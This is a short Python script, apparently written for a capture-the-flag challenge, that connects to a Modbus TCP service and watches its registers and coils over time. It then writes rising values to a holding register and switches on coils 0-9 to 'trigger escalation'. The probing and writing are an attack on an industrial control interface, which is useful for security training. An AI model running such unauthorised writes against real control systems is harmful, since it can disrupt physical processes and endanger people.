from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient("labs.ctfzone.com", port=8663)
client.connect()
print(f"Connected: {client.connected}")

# Monitor over time
print("=== Monitoring Input Registers (sensor readings) over time ===")
for i in range(5):
    rr = client.read_input_registers(address=0, count=20)
    holding = client.read_holding_registers(address=0, count=20)
    coils = client.read_coils(address=0, count=100)
    
    if hasattr(rr, 'registers'):
        print(f"t={i}: Inputs 0-20: {rr.registers}")
    if hasattr(holding, 'registers'):
        print(f"t={i}: Holding 0-20: {holding.registers}")
    if hasattr(coils, 'bits'):
        true_c = [j for j, v in enumerate(coils.bits[:20]) if v]
        print(f"t={i}: True coils 0-20: {true_c}")
    print()
    time.sleep(2)

# Now try to write to holding registers and trigger escalation
print("\n=== Trying to write Holding Register 0 ===")
for val in [1, 10, 100, 500, 1000]:
    r = client.write_register(address=0, value=val)
    rr = client.read_input_registers(address=0, count=20)
    holding = client.read_holding_registers(address=0, count=20)
    if hasattr(holding, 'registers'):
        print(f"Write HR[0]={val} -> HR: {holding.registers[:5]}, Input: {rr.registers[:5]}")
    time.sleep(1)

# Try writing coils
print("\n=== Trying to write Coils ===")
for coil in range(10):
    r = client.write_coil(address=coil, value=True)
    rr = client.read_coils(address=0, count=20)
    if hasattr(rr, 'bits'):
        print(f"Write Coil[{coil}]=True -> Coils 0-19: {rr.bits[:20]}")
    time.sleep(1)

client.close()
